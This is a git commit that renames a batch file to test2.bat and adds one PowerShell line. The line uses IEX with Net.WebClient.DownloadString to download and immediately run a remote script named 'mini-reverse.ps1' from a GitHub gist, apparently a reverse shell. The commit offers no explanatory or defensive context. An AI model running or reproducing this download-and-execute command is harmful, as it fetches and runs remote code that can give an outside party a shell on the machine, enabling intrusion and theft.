8a81950ac37573e0f0ae8afac18bf199d1541dce
maybe-O <zhong572829@gmail.com>
2026-03-25 10:55:45 +0800

    Rename 新建文本文档 (2).bat to test2.bat

---
+++ test2.bat
@@ -0,0 +1,2 @@
+
+powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
